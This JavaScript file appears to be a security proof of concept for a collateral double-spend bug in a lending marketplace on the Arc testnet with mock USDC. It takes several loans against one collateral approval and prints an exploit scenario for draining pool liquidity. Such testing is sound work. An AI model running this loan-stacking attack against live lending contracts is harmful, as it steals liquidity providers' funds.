'use strict';
/**
 * Deep Investigation: Double-Spend Collateral Vulnerability
 *
 * Tests to understand:
 * 1. How many loans can be taken with single approval?
 * 2. What is the actual collateral deduction behavior?
 * 3. Can this drain all pool liquidity?
 */

require('dotenv').config();
const { ethers } = require('ethers');
const ADDRESSES = require('../config/arc-testnet-addresses.json');

const RPC_URL = process.env.ARC_TESTNET_RPC_URL || 'https://arc-testnet.drpc.org';
const ATTACKER_KEY = process.env.PRIVATE_KEY;

const MKT_ABI = [
    'function requestLoan(uint256 amount, uint256 durationDays) returns (uint256)',
    'function agentPools(uint256) view returns (uint256 agentId, address agentAddress, uint256 totalLiquidity, uint256 availableLiquidity, uint256 totalLoaned, uint256 totalEarned, bool isActive)',
    'function loans(uint256) view returns (uint256 loanId, address borrower, uint256 agentId, uint256 amount, uint256 collateralAmount, uint256 interestRate, uint256 startTime, uint256 endTime, uint256 duration, uint8 state)',
];

const ERC20_ABI = [
    'function approve(address spender, uint256 amount) returns (bool)',
    'function balanceOf(address) view returns (uint256)',
    'function allowance(address owner, address spender) view returns (uint256)',
];

const REG_ABI = [
    'function addressToAgentId(address) view returns (uint256)',
];

async function main() {
    console.log('\n' + '═'.repeat(80));
    console.log('  DOUBLE-SPEND VULNERABILITY INVESTIGATION');
    console.log('═'.repeat(80));

    const provider = new ethers.JsonRpcProvider(RPC_URL, undefined, { batchMaxCount: 1 });
    const attacker = new ethers.Wallet(ATTACKER_KEY, provider);

    const registry = new ethers.Contract(ADDRESSES.agentRegistryV2, REG_ABI, provider);
    const mkt = new ethers.Contract(ADDRESSES.agentLiquidityMarketplace, MKT_ABI, attacker);
    const usdc = new ethers.Contract(ADDRESSES.mockUSDC, ERC20_ABI, attacker);

    const attackerId = await registry.addressToAgentId(attacker.address);

    console.log(`\nAttacker: ${attacker.address}`);
    console.log(`Agent ID: ${attackerId}\n`);

    // Get initial state
    const initialBalance = await usdc.balanceOf(attacker.address);
    const pool = await mkt.agentPools(attackerId);

    console.log('Initial State:');
    console.log(`  Attacker USDC: ${ethers.formatUnits(initialBalance, 6)} USDC`);
    console.log(`  Pool Liquidity: ${ethers.formatUnits(pool.availableLiquidity, 6)} USDC`);
    console.log(`  Pool Total Loaned: ${ethers.formatUnits(pool.totalLoaned, 6)} USDC\n`);

    // Approve collateral once
    const loanAmount = ethers.parseUnits('10', 6); // 10 USDC per loan
    const singleCollateral = loanAmount; // 100% collateral = 10 USDC

    console.log('─'.repeat(80));
    console.log('TEST: Approving collateral ONCE for multiple loans');
    console.log('─'.repeat(80));
    console.log(`  Approving ${ethers.formatUnits(singleCollateral, 6)} USDC (collateral for 1 loan)...\n`);

    const approveTx = await usdc.approve(ADDRESSES.agentLiquidityMarketplace, singleCollateral);
    await approveTx.wait();

    const allowanceAfterApproval = await usdc.allowance(attacker.address, ADDRESSES.agentLiquidityMarketplace);
    console.log(`  Allowance: ${ethers.formatUnits(allowanceAfterApproval, 6)} USDC\n`);

    // Try to take multiple loans
    const loans = [];
    let success = 0;

    for (let i = 1; i <= 5; i++) {
        console.log(`Loan Attempt ${i}:`);

        try {
            const balanceBefore = await usdc.balanceOf(attacker.address);
            const allowanceBefore = await usdc.allowance(attacker.address, ADDRESSES.agentLiquidityMarketplace);

            console.log(`  Balance before: ${ethers.formatUnits(balanceBefore, 6)} USDC`);
            console.log(`  Allowance before: ${ethers.formatUnits(allowanceBefore, 6)} USDC`);

            const tx = await mkt.requestLoan(loanAmount, 7);
            const receipt = await tx.wait();

            // Parse loan ID
            let loanId = null;
            for (const log of receipt.logs) {
                if (log.topics?.length >= 2) {
                    const candidate = parseInt(log.topics[1], 16);
                    if (candidate > 0 && candidate < 100000) {
                        loanId = candidate;
                        break;
                    }
                }
            }

            const balanceAfter = await usdc.balanceOf(attacker.address);
            const allowanceAfter = await usdc.allowance(attacker.address, ADDRESSES.agentLiquidityMarketplace);

            const collateralDeducted = balanceBefore - balanceAfter;
            const allowanceConsumed = allowanceBefore - allowanceAfter;

            console.log(`  ✓ Loan #${loanId} APPROVED`);
            console.log(`  Balance after: ${ethers.formatUnits(balanceAfter, 6)} USDC`);
            console.log(`  Collateral deducted: ${ethers.formatUnits(collateralDeducted, 6)} USDC`);
            console.log(`  Allowance after: ${ethers.formatUnits(allowanceAfter, 6)} USDC`);
            console.log(`  Allowance consumed: ${ethers.formatUnits(allowanceConsumed, 6)} USDC\n`);

            loans.push({
                loanId,
                amount: loanAmount,
                collateralDeducted,
                allowanceConsumed
            });

            success++;

        } catch (err) {
            console.log(`  ✗ REJECTED: ${err.message.slice(0, 100)}\n`);
            break;
        }

        await new Promise(r => setTimeout(r, 2000)); // Wait 2s between attempts
    }

    // Final state
    const finalBalance = await usdc.balanceOf(attacker.address);
    const finalAllowance = await usdc.allowance(attacker.address, ADDRESSES.agentLiquidityMarketplace);
    const finalPool = await mkt.agentPools(attackerId);

    console.log('═'.repeat(80));
    console.log('  VULNERABILITY ANALYSIS');
    console.log('═'.repeat(80));

    console.log(`\nLoans Created: ${success} loans with single ${ethers.formatUnits(singleCollateral, 6)} USDC approval`);
    console.log(`\nBalance Changes:`);
    console.log(`  Initial: ${ethers.formatUnits(initialBalance, 6)} USDC`);
    console.log(`  Final: ${ethers.formatUnits(finalBalance, 6)} USDC`);
    console.log(`  Change: ${ethers.formatUnits(initialBalance - finalBalance, 6)} USDC deducted`);

    console.log(`\nAllowance Changes:`);
    console.log(`  Approved: ${ethers.formatUnits(singleCollateral, 6)} USDC`);
    console.log(`  Remaining: ${ethers.formatUnits(finalAllowance, 6)} USDC`);
    console.log(`  Consumed: ${ethers.formatUnits(singleCollateral - finalAllowance, 6)} USDC`);

    console.log(`\nPool Changes:`);
    console.log(`  Initial Available: ${ethers.formatUnits(pool.availableLiquidity, 6)} USDC`);
    console.log(`  Final Available: ${ethers.formatUnits(finalPool.availableLiquidity, 6)} USDC`);
    console.log(`  Initial Loaned: ${ethers.formatUnits(pool.totalLoaned, 6)} USDC`);
    console.log(`  Final Loaned: ${ethers.formatUnits(finalPool.totalLoaned, 6)} USDC`);

    const totalCollateralNeeded = loanAmount * BigInt(success);
    const actualCollateralDeducted = initialBalance - finalBalance;

    console.log(`\n${'═'.repeat(80)}`);
    console.log('SEVERITY ASSESSMENT:');
    console.log('═'.repeat(80));

    if (success > 1) {
        console.log(`\n🚨 CRITICAL VULNERABILITY CONFIRMED`);
        console.log(`\nExpected behavior:`);
        console.log(`  - Approve ${ethers.formatUnits(singleCollateral, 6)} USDC`);
        console.log(`  - Get 1 loan of ${ethers.formatUnits(loanAmount, 6)} USDC`);
        console.log(`  - Require ${ethers.formatUnits(singleCollateral, 6)} USDC collateral`);

        console.log(`\nActual behavior:`);
        console.log(`  - Approved ${ethers.formatUnits(singleCollateral, 6)} USDC once`);
        console.log(`  - Got ${success} loans of ${ethers.formatUnits(loanAmount, 6)} USDC each`);
        console.log(`  - Total loan amount: ${ethers.formatUnits(loanAmount * BigInt(success), 6)} USDC`);
        console.log(`  - Expected collateral: ${ethers.formatUnits(totalCollateralNeeded, 6)} USDC`);
        console.log(`  - Actual collateral: ${ethers.formatUnits(actualCollateralDeducted, 6)} USDC`);
        console.log(`  - UNDERCOLLATERALIZED BY: ${ethers.formatUnits(totalCollateralNeeded - actualCollateralDeducted, 6)} USDC`);

        console.log(`\nIMPACT:`);
        console.log(`  - Attacker can drain pool liquidity with minimal collateral`);
        console.log(`  - ${success}x leverage on collateral (only 1/${success} collateral required)`);
        console.log(`  - Risk of mass defaults and pool insolvency`);

        console.log(`\nEXPLOIT SCENARIO:`);
        console.log(`  1. Approve 100 USDC collateral`);
        console.log(`  2. Take out ${success} loans of 100 USDC each = ${success * 100} USDC borrowed`);
        console.log(`  3. Only 100 USDC collateral held by contract`);
        console.log(`  4. Default on all loans`);
        console.log(`  5. Contract can only seize 100 USDC, loses ${(success - 1) * 100} USDC`);
    } else {
        console.log(`\n✓ Protected: Only 1 loan per approval`);
    }

    console.log(`\n${'═'.repeat(80)}\n`);
}

main().catch(console.error);
